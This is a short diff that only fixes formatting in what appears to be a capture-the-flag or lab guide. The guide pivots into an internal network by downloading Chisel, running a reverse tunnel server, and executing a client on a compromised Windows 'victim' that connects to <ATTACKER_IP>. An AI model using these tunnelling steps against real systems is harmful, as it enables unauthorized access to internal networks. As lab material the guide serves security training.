@@ -45,11 +45,11 @@ Compromised Windows machine must be accessible with valid credentials.
     gunzip chisel_1.9.1_linux_amd64.gz
     mv chisel_1.9.1_linux_amd64 chisel
 
-    # Download and clean-up the Windows version of Chisel v1.9.1
+   # Download and clean-up the Windows version of Chisel v1.9.1
     wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
     gunzip chisel_1.9.1_windows_amd64.gz
     mv chisel_1.9.1_windows_amd64 chisel.exe
-       ```
+    ```
    - Start a listener on the attcking machine:
    ```bash
    ./chisel server --port 5000 --reverse
@@ -57,7 +57,7 @@ Compromised Windows machine must be accessible with valid credentials.
    - Copy the exe version to victim computer and execute it:
    ```bash
    .\chisel.exe client <ATTACKER_IP>:5000 R:8888:127.0.0.1:8000
-   ``
+   ```
    - Get the flag in your attacking machine from the internal network .
    ```bash
    curl localhost:8888
